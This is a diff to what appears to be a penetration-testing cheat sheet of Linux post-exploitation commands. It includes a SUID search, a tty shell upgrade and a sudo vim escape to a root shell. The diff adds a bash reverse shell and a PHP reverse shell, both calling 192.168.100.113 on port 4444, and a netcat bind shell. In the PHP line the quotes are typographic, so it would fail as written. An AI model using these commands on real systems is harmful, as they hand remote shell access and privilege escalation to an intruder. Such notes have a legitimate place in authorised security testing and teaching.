@@ -70,17 +70,21 @@ find / -user root -perm -4000 -exec ls -ldb {} \;
 ```bash
 # Get a tty shell
 python -c 'import pty; pty.spawn("/bin/sh")'
-
 # Upgrade shell to a tty
 SHELL=/bin/bash script -q /dev/null
-
 # Set terminal
 export TERM=xterm-256color
-
 #Switch to the background with CTRL+Z
 
 # If sudo -l in user has access to /usr/bin/vim
 sudo vim -c ":!/bin/sh"
+
+# Bash reverse shell
+bash -i >& /dev/tcp/192.168.100.113/4444 0>&1
+# PHP reverse shell
+php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+# Netcat Bind shell
+nc -lvp 4444 -e /bin/sh
 ```
 <br/>
 
